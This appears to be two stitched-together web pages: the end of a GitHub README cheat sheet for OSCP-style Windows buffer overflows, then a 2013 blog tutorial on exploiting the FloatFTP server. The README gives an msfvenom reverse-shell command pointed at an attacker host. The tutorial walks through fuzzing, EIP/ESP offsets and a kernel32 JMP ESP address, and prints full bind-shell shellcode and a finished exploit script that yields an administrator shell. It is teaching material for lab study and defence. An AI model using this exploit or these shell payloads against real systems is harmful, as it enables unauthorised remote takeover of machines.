above.\nFuzzing\nWe will run the connect.py script to verify the application's response.\nAfter this step, we will run the fuzzing.py script to identify the\npoint that the application will crash. But before that, on your\nWindows, attach the application to the Immunity Debugger.\nChange the amount of \"A\" in the script until the application broken.\nOffset\nAfter finding the crash point of the application, we will identify the\noffset to the EIP address. For this we will generate a string with the\npattern_create, from the MSF suite\nmsf-pattern_create -l 1024\nCopy the EIP address into the Immunity Debugger and use the\npattern_offset to identify this address\nmsf-pattern_offset -q 39654138\nNow we can run poc.py and verify that our EIP has been overwritten with\nthe character \"B\" (42 in hexadecimal)\nBadchars\nTo identify badchars we will use mona with the option !mona bytearray.\nInsert the mona output in the badchars.py script and run against the\napplication to identify the badchars.\nThere are many ways to carry out the badchar identification process\n(even mona has modules for that), but the most accurate way is\nvisually. Follow the ASCII string in the Immunity Debugger and see what\npoints this string crashed or skipped over.\nJMP ESP\nAfter knowing the badchars of the application, we will identify the JMP\nESP that will be responsible for changing the natural flow of the\napplication and making it run the shellcode that we will insert into\nthe stack.\nThe OPCODE for JMP ESP is \\xff\\xe4 (in assembly). Using mona we will\nlocate which register in the application that points to this OPCODE and\nso we can change the flow of the application to run our shellcode,\nrewriting the stack from its base (EBP).\nRun !mona modules and identify the unprotected modules.\nRun !mona find -s \"\\xff\\xe4\" to identify which of these pointers have\nthe OPCODE for JMP ESP\nRun !mona jmp -r esp -cpb \"\\x00\\x0a\" to identify which pointers do not\nhave the badchars found.\nBy this point you may have already found the correct JMP ESP address.\nHowever, if you want to check, run !mona find -s \"\\xff\\xe4\" -m\ndostackbufferoverflowgood.exe directly on the identified vulnerable\nmodule.\nAt this point you will have the base address of the stack or return\naddress (EBP). We need to convert this address to little-endian format\nto use it in our code. Just invert the bytes to perform this\nconversion:\n0x080416BF  <->  \"\\xBF\\x16\\x04\\x08\"\nExploit time\nWe can now generate our shellcode excluding the badchars found:\nmsfvenom -p windows\/shell_reverse_tcp LHOST=192.168.56.103 LPORT=443 EXITFUNC=th\nread  -f c \u2013e x86\/shikata_ga_nai -b \"\\x00\\x0a\"\nThe EXITFUNC=thread option prevents the shellcode from crashing the\napplication when executing our shellcode.\nNow just insert the msfvenom output in our exploit.py and run it\nagainst our application to gain access to the system exploiting the\nBuffer Overflow\nAbout\nOSCP Buffer Overflow cheat sheet\nResources\n[88]Readme\n[89]Activity\nStars\n[90]171 stars\nWatchers\n[91]5 watching\nForks\n[92]48 forks\n[93]Report repository\n[94]Releases\nNo releases published\n[95]Packages 0\nNo packages published\nLanguages\n* [96]Python 100.0%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [97]Terms\n* [98]Privacy\n* [99]Security\n* [100]Status\n* [101]Docs\n* [102]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"#[1]Proactive Defense - Atom [2]Proactive Defense - RSS [3]Proactive\nDefense - Atom\n[4]Proactive Defense\nKnow your enemy.\nSunday, May 19, 2013\nUnderstanding Buffer Overflow Exploits\nThe first time that I had to work with a buffer overflow exploit, I was\ncompletely out of my depth. Although I could build networks and\nconfigure firewalls, proxies, and intrusion detection systems without\nbreaking a sweat, exploit coding was a whole new world to me. However,\nas with any complex or difficult concept, breaking it down into\nmanageable pieces proved to be an effective strategy.\nAfter conducting research and following tutorials, the concepts and\ntools started to become less confusing and the details began to stick.\nI then started looking for simple buffer overflow vulnerabilities in\nknown applications that I could recreate in my lab. It is in a working\nlab that concepts begin to click and the process - in its individual\nparts as well as a whole - becomes visible.\nThis tutorial will provide defenders with a basic idea of the\nattackers' exploit development process, the level of effort required,\nand the challenges that attackers face when writing malicious code to\ntarget specific vulnerabilities.\nToday's attackers are determined and skilled and an understanding of\nhow they operate is key for anyone tasked with defending computers and\nnetworks. The more understanding the defender has of the enemies\nmotives and techniques the easier it is to formulate effective\ncountermeasures.\nI will go through several phases of exploit development and arrive at a\nworking exploit. First, we will fuzz our target application to make it\ncrash in interesting ways, monitor the crashes with Immunity debugger,\nand find a vulnerable location in Windows memory to target with our\nshellcode. We will then create an exploit to deliver the shellcode and\ncompromise the remote system.\nRequired Software \/ Setup\nAttacking system: [5]Backtrack Linux (I used R3)\nDevelopment \/ Victim system: Windows XP SP3 English\n[6]Immunity debugger - Installed on Windows XP system\n[7]FloatFTP - The application we are going to exploit - (Ignore the\nexisting exploit on this page for now and click the \"vulnerable app\"\nbutton to download. Extract the file to a folder on the desktop of the\nXP system.)\nLet's get started.\nFuzzing\n\"Fuzzing\" is a software testing practice in which malformed, excessive\nand random data is send to a computer program in attempts to make it\ncrash or behave in unintended ways. Fuzzing is used test security of\nprograms and systems.\nDouble click the float FTP executable to start the application:\n[8][floatFTP.JPG]\nVerify that it's running and listening on port 21 by opening a cmd\nprompt and typing:\nnetstat -an | find \"21\"\n[9][1a.JPG]\nStart Immunity debugger and click \"file\", then \"attach.\" Select the\nFTPServer process and click \"attach.\"\n[10][attach.JPG]\nOnce the application loads up in the debugger, it will be in a paused\nstate. Press F9 or click the play symbol on the Immunity tool bar to\nlet the application run. The target application is now being monitored\nby the debugger.\n[11][debug1.JPG]\nWe will now begin the process of configuring our FTP fuzzer, first\nfuzzing the application to make it crash and then capturing and\nanalyzing the crash data with the debugger.\nThe code posted below is a simple fuzzer for FTP written in the Python\nscripting language. When executed, the fuzzer will send the standard\nFTP command \"REST\" with increasing amounts of \"A\"s appended to each\ncommand.\n#!\/usr\/bin\/python\nimport socket\n# Create an array of buffers, from 20 to 2000, with increments of 20.\nbuffer=[\"A\"]\ncounter=20\nwhile len(buffer) <= 30:\nbuffer.append(\"A\"*counter)\ncounter=counter+100\n# Define the FTP commands to be fuzzed\ncommands=[\"REST\"]\n# Run the fuzzing loop\nfor command in commands:\nfor string in buffer:\nprint \"Fuzzing\" + command + \" with length:\" +str(len(string))\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nconnect=s.connect(('10.10.10.32',21)) # Target IP address\ns.recv(1024)\ns.send('USER ftp\\r\\n') # login user\ns.recv(1024)\ns.send('PASS ftp\\r\\n') # login password\ns.recv(1024)\ns.send(command + ' ' + string + '\\r\\n') # buffer\ns.recv(1024)\ns.send('QUIT\\r\\n')\ns.close()\nWe can see from the example exploit\n([12]http:\/\/www.exploit-db.com\/exploits\/17546\/) that the FTP server\nREST command is vulnerable to a buffer overflow. The FTP function REST\nwill be the target of the fuzzer.\nCreate a folder on the desktop of the attacking system to store the\nfuzzing and exploit code. \"cd\" to this directory and run \"nano\nfuzzer.py\". This will open the nano text editor on a blank page. Copy\nand paste the code above into the file.\n[13][fuzzer4.JPG]\nModify the target IP address with the IP address of the system where\nthe FloatFTP process is running. Press ctrl+o to save the file and\nctrl+x to exit nano. Next, make the file executable by typing:\nchmod 755 fuzzer.py\nExecute \".\/fuzzer.py\". After a few seconds you should see the fuzzer\nstop indicating that the target application has crashed.\n[14][fuzzer.JPG]\nWhen you look at the debugger on the XP system, you will see that\nImmunity has captured the crash data and paused the application. If you\nlook at the EIP (Extended Instruction Pointer) register, you will see\nthat the 41s from the fuzzer's buffer have overwritten the register and\nhave also spilled into the ESP (Extended Stack Pointer) register\n(00AEFC2C). Our first object is to gain control of the EIP register,\nwhich controls which code is executed by the CPU, setting it to a value\nof our choosing.\n[15][fuzzer3.JPG]\nExploit Development\nCreate a new file with nano and enter the code below. This will be the\nbeginning of our exploit. Save the file as skeleton.py and make it\nexecutable (chmod 755 skeleton.py).\n#!\/usr\/bin\/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = '\\x41' * 1000\nprint \"\\nSending evil buffer...\"\ns.connect(('10.10.10.32',21))\ndata = s.recv(1024)\ns.send('USER ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('PASS ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('REST' +buffer+'\\r\\n')\ns.close()\nRun .\/skeleton.py in the Linux terminal on the attacking system.\nNow when you examine the EIP register in Immunity you will see that the\nbuffer code has overwritten the register with 41414141 and well as\nspilled into the ESP register.\n[16][1ef.JPG]\nThe next step is to determine exactly how much space we have to insert\ncode. Up until now, we have used a fixed set of repeating characters to\ndetermine our target memory address. We will now use the Metasploit\npattern_create and pattern_offset tools to help us discover exactly how\nmuch space we have and what specific memory addresses to target. First,\ngenerate a non-repeating string with 1000 characters.\ncd to \/opt\/metasploit\/msf3\/tools and run:\n.\/pattern_create.rb 1000\nCreate a 1000 character string which will replace the previous 1000\ncharacter \"A\" buffer in the skeleton exploit.\n[17][pattern_create1000.JPG]\nComment out the previous buffer in the exploit and create a new buffer\nline as below. Enclose the new buffer in double quotes.\n#!\/usr\/bin\/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#buffer = '\\x41' * 1000\nbuffer = \"Paste pattern_create buffer here\"\nprint \"\\nSending evil buffer...\"\ns.connect(('10.10.10.32',21))\ndata = s.recv(1024)\ns.send('USER ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('PASS ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('REST' +buffer+'\\r\\n')\ns.close()\nRestart the FTP server in Immunity debugger (click debug, then restart\nor press Ctrl+F2) and launch the skeleton exploit against the FTP\nserver. It should crash as it did previously, but will now have the\nMetasploit created pattern in its EIP and ESP buffers. Copy these\nvalues down; we will use them to calculate the byte difference between\nthe EIP and ESP registers.\nIn my case, the EIP and ESP values are:\nEIP: 69413269\nESP: 00AEFC2C (69413669)\n[18][patternoffset2.JPG]\nNext, run:\n.\/pattern_offset.rb 69413269\nFollowed by:\n.\/pattern_offset.rb 69413669\n[19]\n[patternoffset.JPG]\nThe output tells us that after 247 bytes the EIP register begins to get\noverwritten with the buffer. This means that bytes 248-251 are EIP and\nthe exact bytes we want to target.\nThe CPU knows which instruction to run next by looking at the value of\nthe EIP register and executing the instruction present at that memory\naddress. Placing a  JMP ESP instruction at the EIP memory location will\ncause the CPU to execute that instruction and \"jump\" to the ESP\nregister to execute whatever resides in memory at that address. Our\nnext objective is to place a JMP ESP instruction in EIP which will\nenable us to control the execution flow and divert it to our code in\nthe ESP register.\nThere are 12 bytes between the two registers, so we will pad our buffer\nwith 8 bytes to bridge the gap and line up the ESP register.\nWe adjust the buffer in our skeleton exploit staying within our 1000\nbyte boundary:\nbuffer = \"\\x41\"*247 + \"\\x42\\x42\\x42\\x42\" + \"\\x43\"*8 + \"\\x44\"*741\neg: [buffer]<>[eip data]<>[padding]<>[shellcode placeholder]\n#!\/usr\/bin\/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#buffer = x41 * 1000\n#buffer = \"pattern_create buffer\"\nbuffer = \"\\x41\"*247 + \"\\x42\\x42\\x42\\x42\" + \"\\x43\"*8 + \"\\x44\"*741\nprint \"\\nSending evil buffer...\"\ns.connect(('10.10.10.32',21))\ndata = s.recv(1024)\ns.send('USER ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('PASS ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('REST' +buffer+'\\r\\n')\ns.close()\nRestart the FTP server in Immunity and press the play button to\nun-pause the application.\nRun the exploit again, then right click ESP in the Registers pane of\nImmunity and select \"follow in dump.\" If everything has lined up\ncorrectly, the EIP register will contain 42424242 and the Ds (x44) will\nbegin at the ESP memory address directly preceded by the 8 Cs which pad\nthe distance from EIP to ESP.\n[20][1k.JPG]\n[21][ESPds.JPG]\nExcellent. In Immunity, copy the ESP memory address from where the Ds\nbegin to where they end. Then open Windows calculator and switch to\nhexadecimal mode and convert each value to decimal.\nIn my case, this is:\nBegins: 00AEFC2C = 11467820\nEnds: 00AEFF0C = 11468556\nSubtract the first value from the second 11468556 - 11467820 = 736.\nThis tells us we have 736 bytes for our shellcode.\nNow that we have our target memory addresses and instructions, we need\na way to get our instructions from the EIP register to the ESP\nregister. To do this we can use an existing JMP ESP instruction in a\nWindows operating system DLL.\nTo find a JMP ESP instruction in an existing Windows DLL - click \"e\" on\nthe Immunity toolbar, then double click a DLL, right click search,\nselect \"command\" and type \"JMP ESP\".\nWe find the instruction we are looking for in the Windows kernel32.dll\nsystem file and make note of the memory address of JMP ESP. In my case,\nthis is 7C86467B. Note that this instruction will reside in a different\nlocation if you are using anything other than 32bit Windows XP English\nSP3. If you are, find a JMP ESP instruction in another DLL and\nsubstitute the memory address in the rest of the tutorial.\n[22][1L.JPG]\nLet's update our skeleton exploit with a new buffer. Comment out the\nlast buffer statement and replace it with the code below.\nbuffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + \"\\xCC\"*741\nBecause of little endian CPU architecture, the JMP ESP address must be\nformatted backwards in the buffer, so 7C86467B becomes\n\"\\x7B\\x46\\x86\\x7C\". We will also add 8 Bs as padding (\"\\x43\"*8) and\nchange the last value to \\xCC*741 (742 CC's) which will act as a place\nholder for our shellcode. All going well, the CCs should begin at the\nESP memory address we are targeting, 00AEFC2C, and we should find our\nJMP ESP instruction (7C86467B) in the EIP register.\n#!\/usr\/bin\/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#buffer = x41 * 1000\n#buffer = \"pattern_create buffer\"\n#buffer = \"\\x41\"*247 + \"\\x44\\x44\\x44\\x44\" + \"\\x43\"*8 + \"\\x44\"*741\n# Windows XP SP3 kernel32.dll  JMP ESP\nbuffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + \"\\xCC\"*741\nprint \"\\nSending evil buffer...\"\ns.connect(('10.10.10.32',21))\ndata = s.recv(1024)\ns.send('USER ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('PASS ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('REST' +buffer+'\\r\\n')\ns.close()\nRestart FTPserver.exe in Immunity by clicking \"debug\" then \"restart\".\nDon't forget to press F9 or to click the play button in the debugger to\nun-pause the application.\nClick the arrow pointing to the three dots on the Immunity toolbar,\nenter JMP ESP memory location: 7C86467B (in this example), click \"Ok\"\nthen press F2 to set a breakpoint in the debugger. When the JMP ESP\naddress is accessed, the debugger will pause execution enabling us to\nreview the registers and verify that we have targeted EIP and ESP\ncorrectly.\n[23][1m.JPG]\nRun the exploit again and review the output in the debugger. It should\nlook similar to this:\n[24][1n.JPG]\nExcellent. EIP contains our JMP ESP target address (7C86467B) and our\nCCs begin on ESP (00AEFC2C). Now that we control execution flow, all\nthat remains is replacing our placeholder CCs with shellcode.\nShellcode and exploit\nWe will use Metasploit msfpayload to create the shellcode payload. One\nthing to note: Since we are passing all this as a \u201cstring\u201d we must\nabide by the character limitations of the FTP protocol. This means no\nnull, return, newline, or @ characters. In hex they are represented by\n\\x00, \\x0d, \\x0a, 0x40. Other characters which could prevent the\nshellcode from executing are \"\\x40\\xff\\\\x3d\\x20\"\nThe msfpayload command below will create shellcode that when executed\non the target system will open a port listening on TCP 999. The\nmsfencode statement ensures there are no bad characters in the\nshellcode which could prevent it from executing.\nmsfpayload windows\/shell_bind_tcp EXITFUNC=seh LPORT=999 R | msfencode -b '\\x40\\\nx0A\\x00\\x0D\\xff\\x0d\\x3d\\x20'\nThis results in a 368 byte payload:\n[*] x86\/shikata_ga_nai succeeded with size 368 (iteration=1)\nbuf =\n\"\\xba\\x2e\\x27\\xc2\\x55\\xdb\\xdc\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\" +\n\"\\xb1\\x56\\x31\\x57\\x13\\x83\\xef\\xfc\\x03\\x57\\x21\\xc5\\x37\\xa9\" +\n\"\\xd5\\x80\\xb8\\x52\\x25\\xf3\\x31\\xb7\\x14\\x21\\x25\\xb3\\x04\\xf5\" +\n\"\\x2d\\x91\\xa4\\x7e\\x63\\x02\\x3f\\xf2\\xac\\x25\\x88\\xb9\\x8a\\x08\" +\n\"\\x09\\x0c\\x13\\xc6\\xc9\\x0e\\xef\\x15\\x1d\\xf1\\xce\\xd5\\x50\\xf0\" +\n\"\\x17\\x0b\\x9a\\xa0\\xc0\\x47\\x08\\x55\\x64\\x15\\x90\\x54\\xaa\\x11\" +\n\"\\xa8\\x2e\\xcf\\xe6\\x5c\\x85\\xce\\x36\\xcc\\x92\\x99\\xae\\x67\\xfc\" +\n\"\\x39\\xce\\xa4\\x1e\\x05\\x99\\xc1\\xd5\\xfd\\x18\\x03\\x24\\xfd\\x2a\" +\n\"\\x6b\\xeb\\xc0\\x82\\x66\\xf5\\x05\\x24\\x98\\x80\\x7d\\x56\\x25\\x93\" +\n\"\\x45\\x24\\xf1\\x16\\x58\\x8e\\x72\\x80\\xb8\\x2e\\x57\\x57\\x4a\\x3c\" +\n\"\\x1c\\x13\\x14\\x21\\xa3\\xf0\\x2e\\x5d\\x28\\xf7\\xe0\\xd7\\x6a\\xdc\" +\n\"\\x24\\xb3\\x29\\x7d\\x7c\\x19\\x9c\\x82\\x9e\\xc5\\x41\\x27\\xd4\\xe4\" +\n\"\\x96\\x51\\xb7\\x60\\x5b\\x6c\\x48\\x71\\xf3\\xe7\\x3b\\x43\\x5c\\x5c\" +\n\"\\xd4\\xef\\x15\\x7a\\x23\\x0f\\x0c\\x3a\\xbb\\xee\\xae\\x3b\\x95\\x34\" +\n\"\\xfa\\x6b\\x8d\\x9d\\x82\\xe7\\x4d\\x21\\x57\\xa7\\x1d\\x8d\\x07\\x08\" +\n\"\\xce\\x6d\\xf7\\xe0\\x04\\x62\\x28\\x10\\x27\\xa8\\x5f\\x16\\xe9\\x88\" +\n\"\\x0c\\xf1\\x08\\x2f\\xb1\\xe6\\x84\\xc9\\xdf\\xf8\\xc0\\x42\\x77\\x3b\" +\n\"\\x37\\x5b\\xe0\\x44\\x1d\\xf7\\xb9\\xd2\\x29\\x11\\x7d\\xdc\\xa9\\x37\" +\n\"\\x2e\\x71\\x01\\xd0\\xa4\\x99\\x96\\xc1\\xbb\\xb7\\xbe\\x88\\x84\\x50\" +\n\"\\x34\\xe5\\x47\\xc0\\x49\\x2c\\x3f\\x61\\xdb\\xab\\xbf\\xec\\xc0\\x63\" +\n\"\\xe8\\xb9\\x37\\x7a\\x7c\\x54\\x61\\xd4\\x62\\xa5\\xf7\\x1f\\x26\\x72\" +\n\"\\xc4\\x9e\\xa7\\xf7\\x70\\x85\\xb7\\xc1\\x79\\x81\\xe3\\x9d\\x2f\\x5f\" +\n\"\\x5d\\x58\\x86\\x11\\x37\\x32\\x75\\xf8\\xdf\\xc3\\xb5\\x3b\\x99\\xcb\" +\n\"\\x93\\xcd\\x45\\x7d\\x4a\\x88\\x7a\\xb2\\x1a\\x1c\\x03\\xae\\xba\\xe3\" +\n\"\\xde\\x6a\\xc4\\x12\\xd2\\x66\\x51\\x8d\\x87\\xca\\x3f\\x2e\\x72\\x08\" +\n\"\\x46\\xad\\x76\\xf1\\xbd\\xad\\xf3\\xf4\\xfa\\x69\\xe8\\x84\\x93\\x1f\" +\n\"\\x0e\\x3a\\x93\\x35\"\nComment out the previous buffer statement and add the new modified\nstatement:\nbuffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + shellcode + \"\\xCC\"*373\nAfter having some issues with the shellcode running and double checking\nall parameters including \"bad characters\", I decide to add NOPs to the\nbuffer just before the shellcode. In computer CPUs, a NOP slide is a\nsequence of NOP (no-operation) instructions (opcode 0x90) meant to\n\"slide\" the CPU's instruction execution flow to its final destination.\nNOPs often help when everything appears to line up correctly in an\nexploit but execution of the shellcode is failing.\nI once again modify the buffer now adding 16 NOPs just before the\nshellcode:\nbuffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + \"\\x90\"*16 + shellcode + \"\\\nxCC\"*357\neg: [buffer]<>[EIP - JMP ESP]<>[EIP to ESP\npadding]<>[NOPs]<>[shellcode]<>[Padding]\nAnd the final complete exploit:\n#!\/usr\/bin\/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#buffer = '\\x41' * 1000\n#buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\nAc3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae\n9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5A\nh6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2\nAk3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am\n9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5A\np6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2\nAs3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au\n9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5A\nx6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2\nBa3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc\n9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5B\nf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B\"\n#buffer = \"\\x41\"*247 + \"\\x42\\x42\\x42\\x42\" + \"\\x43\"*8 + \"\\x44\"*741\n## msfpayload windows\/shell_bind_tcp EXITFUNC=seh LPORT=999 R | msfencode -b '\\x\n40\\x0A\\x00\\x0D' 368 bytes\nshellcode = (\"\\xba\\x2e\\x27\\xc2\\x55\\xdb\\xdc\\xd9\\x74\\x24\\xf4\\x5f\\x2b\\xc9\"\n\"\\xb1\\x56\\x31\\x57\\x13\\x83\\xef\\xfc\\x03\\x57\\x21\\xc5\\x37\\xa9\"\n\"\\xd5\\x80\\xb8\\x52\\x25\\xf3\\x31\\xb7\\x14\\x21\\x25\\xb3\\x04\\xf5\"\n\"\\x2d\\x91\\xa4\\x7e\\x63\\x02\\x3f\\xf2\\xac\\x25\\x88\\xb9\\x8a\\x08\"\n\"\\x09\\x0c\\x13\\xc6\\xc9\\x0e\\xef\\x15\\x1d\\xf1\\xce\\xd5\\x50\\xf0\"\n\"\\x17\\x0b\\x9a\\xa0\\xc0\\x47\\x08\\x55\\x64\\x15\\x90\\x54\\xaa\\x11\"\n\"\\xa8\\x2e\\xcf\\xe6\\x5c\\x85\\xce\\x36\\xcc\\x92\\x99\\xae\\x67\\xfc\"\n\"\\x39\\xce\\xa4\\x1e\\x05\\x99\\xc1\\xd5\\xfd\\x18\\x03\\x24\\xfd\\x2a\"\n\"\\x6b\\xeb\\xc0\\x82\\x66\\xf5\\x05\\x24\\x98\\x80\\x7d\\x56\\x25\\x93\"\n\"\\x45\\x24\\xf1\\x16\\x58\\x8e\\x72\\x80\\xb8\\x2e\\x57\\x57\\x4a\\x3c\"\n\"\\x1c\\x13\\x14\\x21\\xa3\\xf0\\x2e\\x5d\\x28\\xf7\\xe0\\xd7\\x6a\\xdc\"\n\"\\x24\\xb3\\x29\\x7d\\x7c\\x19\\x9c\\x82\\x9e\\xc5\\x41\\x27\\xd4\\xe4\"\n\"\\x96\\x51\\xb7\\x60\\x5b\\x6c\\x48\\x71\\xf3\\xe7\\x3b\\x43\\x5c\\x5c\"\n\"\\xd4\\xef\\x15\\x7a\\x23\\x0f\\x0c\\x3a\\xbb\\xee\\xae\\x3b\\x95\\x34\"\n\"\\xfa\\x6b\\x8d\\x9d\\x82\\xe7\\x4d\\x21\\x57\\xa7\\x1d\\x8d\\x07\\x08\"\n\"\\xce\\x6d\\xf7\\xe0\\x04\\x62\\x28\\x10\\x27\\xa8\\x5f\\x16\\xe9\\x88\"\n\"\\x0c\\xf1\\x08\\x2f\\xb1\\xe6\\x84\\xc9\\xdf\\xf8\\xc0\\x42\\x77\\x3b\"\n\"\\x37\\x5b\\xe0\\x44\\x1d\\xf7\\xb9\\xd2\\x29\\x11\\x7d\\xdc\\xa9\\x37\"\n\"\\x2e\\x71\\x01\\xd0\\xa4\\x99\\x96\\xc1\\xbb\\xb7\\xbe\\x88\\x84\\x50\"\n\"\\x34\\xe5\\x47\\xc0\\x49\\x2c\\x3f\\x61\\xdb\\xab\\xbf\\xec\\xc0\\x63\"\n\"\\xe8\\xb9\\x37\\x7a\\x7c\\x54\\x61\\xd4\\x62\\xa5\\xf7\\x1f\\x26\\x72\"\n\"\\xc4\\x9e\\xa7\\xf7\\x70\\x85\\xb7\\xc1\\x79\\x81\\xe3\\x9d\\x2f\\x5f\"\n\"\\x5d\\x58\\x86\\x11\\x37\\x32\\x75\\xf8\\xdf\\xc3\\xb5\\x3b\\x99\\xcb\"\n\"\\x93\\xcd\\x45\\x7d\\x4a\\x88\\x7a\\xb2\\x1a\\x1c\\x03\\xae\\xba\\xe3\"\n\"\\xde\\x6a\\xc4\\x12\\xd2\\x66\\x51\\x8d\\x87\\xca\\x3f\\x2e\\x72\\x08\"\n\"\\x46\\xad\\x76\\xf1\\xbd\\xad\\xf3\\xf4\\xfa\\x69\\xe8\\x84\\x93\\x1f\"\n\"\\x0e\\x3a\\x93\\x35\")\n## Windows XP SP3 kernel32.dll 7C86467B JMP ESP\n#buffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + \"\\xCC\"*741\nbuffer = \"\\x41\"*247 + \"\\x7B\\x46\\x86\\x7C\" + \"\\x42\"*8 + \"\\x90\"*16 + shellcode + \"\\\nxCC\"*357\nprint \"\\nSending evil buffer...\"\ns.connect(('10.10.10.32',21))\ndata = s.recv(1024)\ns.send('USER ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('PASS ftp' +'\\r\\n')\ndata = s.recv(1024)\ns.send('REST' +buffer+'\\r\\n')\ns.close()\nClose the debugger on the XP system and restart FloatFTP. Launch the\nexploit from the attacking system, then telnet to port 999 on the FTP\nserver. All going well, you should receive a shell running as\nadministrator (or as whoever started the FloatFTP process).\n[25][sploit2.jpg]\nAs you can see the system is now compromised and under the control of\nthe attacker.\nPosted by [26]ProactiveDefender at [27]4:29\u202fPM\n[28]Email This[29]BlogThis![30]Share to Twitter[31]Share to\nFacebook[32]Share to Pinterest\n9 comments:\n1. [33]Hassen[34]June 7, 2013 at 6:27\u202fPM\nThank you for you excellent post.\nReply[35]Delete\nReplies\nReply\n2. [36]xRaisen[37]June 8, 2013 at 7:24\u202fAM\nThis comment has been removed by the author.\nReply[38]Delete\nReplies\nReply\n3. [39]xRaisen[40]June 8, 2013 at 7:26\u202fAM\nSupa thanks!\nReply[41]Delete\nReplies\nReply\n4. [42]alt3kx[43]June 9, 2013 at 3:33\u202fPM\nSimple and good explanation, congrats!!\ncheers\n\/alt3kx.\nReply[44]Delete\nReplies\nReply\n5. [45]Owen[46]June 19, 2013 at 5:56\u202fAM\nExcellent tutorial, very well structured!\nReply[47]Delete\nReplies\nReply\n6. [48]Keith Loughnane[49]June 27, 2013 at 3:45\u202fPM\nThis comment has been removed by the author.\nReply[50]Delete\nReplies\nReply\n7. [51]Unknown[52]July 12, 2013 at 11:45\u202fAM\nThis is such a great post, very clear and concise. I'm walking\nthrough it now. Great stuff, thanks!\nReply[53]Delete\nReplies\nReply\n8. [54]Unknown[55]July 12, 2013 at 2:17\u202fPM\nActually so I'm walking through your exercise, and I noticed that I\ncouldn't get ESP to overwrite with a fuzzer 'A' buffer size of 20.\nI had to drop the buffer size down to 10 before I was seeing ESP\nand EIP get overwritten.\nFor anyone else trying this stuff out, basically just change\ncounter=20 to counter=10 in fuzzer.py if you experience the issue\nI'm experiencing... after doing this, I see ESP and EIP get\noverwritten just fine, just as the tutorial says.\nReply[56]Delete\nReplies\nReply\n9. [57]Unknown[58]November 22, 2017 at 4:57\u202fAM\n\\\\74.117..114.86\\max++.x86.dll is not accessible. when I am trying\nto run the application.\nReply[59]Delete\nReplies\nReply\nAdd comment\nLoad more...\n[60]Older Post [61]Home\nSubscribe to: [62]Post Comments (Atom)\nAbout Me\n[63]My photo\n[64]ProactiveDefender\nI am an Information Security researcher and consultant.\nInformation Security has been my professional focus and passion\nfor the past 15 years. I work as the Director of Information\nSecurity for an internet retailer where I help to manage a\nsecurity program and infrastructure.\n[65]View my complete profile\nBlog Archive\n* [66]\u25bc  [67]2013 (1)\n+ [68]\u25bc  [69]May (1)\no [70]Understanding Buffer Overflow Exploits\n* [71]\u25ba  [72]2012 (2)\n+ [73]\u25ba  [74]June (1)\n+ [75]\u25ba  [76]January (1)\n* 